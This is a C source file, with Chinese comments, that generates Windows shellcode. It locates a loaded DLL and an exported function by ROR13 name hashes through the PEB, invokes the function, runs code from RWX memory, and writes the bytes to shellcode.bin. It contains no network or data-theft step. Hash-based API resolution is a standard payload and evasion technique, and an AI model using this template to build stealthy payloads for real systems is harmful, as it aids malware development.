#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <wchar.h>

PPEB get_peb();
HMODULE __stdcall find_module_by_hash(DWORD hash);
FARPROC __stdcall find_function(HMODULE module, DWORD hash);
DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string);
DWORD __stdcall ror13_hash(const char *string);

void __stdcall shell_code_entry()
{
	HMODULE hookdll;
	hookdll = find_module_by_hash(0xE122D6A3);
	FARPROC hook= find_function(hookdll, 0x93781C2B);
	hook();
}

HMODULE __stdcall find_module_by_hash(DWORD hash)
{
	PPEB peb;
	LDR_DATA_TABLE_ENTRY *module_ptr, *first_mod;

	peb = get_peb();

	module_ptr = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
	first_mod = module_ptr;

	do {
		if (unicode_ror13_hash((WCHAR *)module_ptr->FullDllName.Buffer) == hash)
			return (HMODULE)module_ptr->Reserved2[0];
		else
			module_ptr = (PLDR_DATA_TABLE_ENTRY)module_ptr->Reserved1[0];
	} while (module_ptr && module_ptr != first_mod);   // because the list wraps,

	return (HMODULE)INVALID_HANDLE_VALUE;
}

FARPROC __stdcall find_function(HMODULE module, DWORD hash)
{
	IMAGE_DOS_HEADER *dos_header;
	IMAGE_NT_HEADERS *nt_headers;
	IMAGE_EXPORT_DIRECTORY *export_dir;
	DWORD *names, *funcs;
	WORD *nameords;
	int i;

	dos_header = (IMAGE_DOS_HEADER *)module;
	nt_headers = (IMAGE_NT_HEADERS *)((char *)module + dos_header->e_lfanew);
	export_dir = (IMAGE_EXPORT_DIRECTORY *)((char *)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	names = (DWORD *)((char *)module + export_dir->AddressOfNames);
	funcs = (DWORD *)((char *)module + export_dir->AddressOfFunctions);
	nameords = (WORD *)((char *)module + export_dir->AddressOfNameOrdinals);

	for (i = 0; i < export_dir->NumberOfNames; i++)
	{
		char *string = (char *)module + names[i];
		if (hash == ror13_hash(string))
		{
			WORD nameord = nameords[i];
			DWORD funcrva = funcs[nameord];
			return (FARPROC)((char *)module + funcrva);
		}
	}

	return NULL;
}

#ifdef _WIN64
PPEB get_peb(void)
{
	//64位不能内联汇编，所以用winhex打开最终生成的shellcode.bin找到get_peb函数偏移处进行修改：
	//65 48 8B 04 25 60 00 00 00,即mov rax,gs:[0x60]
	//后面的全部填入90，直到遇到C3
	int a = 0;
	return 0;
}
#else
PPEB __declspec(naked) get_peb(void)
{
	__asm 
	{
		mov eax, fs:[0x30]
		ret
	}
}
#endif

DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string)
{
	DWORD hash = 0;
	if (unicode_string != NULL)
	{
		while (*unicode_string != 0)
		{
			DWORD val = (DWORD)*unicode_string++;
			hash = (hash >> 13) | (hash << 19); // ROR 13
			hash += val;
		}
	}
	return hash;
}

DWORD __stdcall ror13_hash(const char *string)
{
	DWORD hash = 0;
	if (string != NULL)
	{
		while (*string) {
			DWORD val = (DWORD)*string++;
			hash = (hash >> 13) | (hash << 19);  // ROR 13
			hash += val;
		}
	}
	return hash;
}

void END_SHELLCODE(void) {}

void RunShellCode(char* buffer)
{ 
	int size = (int)END_SHELLCODE - (int)shell_code_entry;
	PVOID p = NULL;
	if ((p = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
		return;
	if (!(memcpy(p, shell_code_entry, size)))
		return;
	((void(*)())p)();
}

int main(int argc, char *argv[])
{
	//printf("%X", ror13_hash("GetCurrentProcess"));

	FILE *output_file = fopen("shellcode.bin", "w");
	fwrite(shell_code_entry,1, (int)END_SHELLCODE - (int)shell_code_entry, output_file);
	fclose(output_file);
	return 0;
}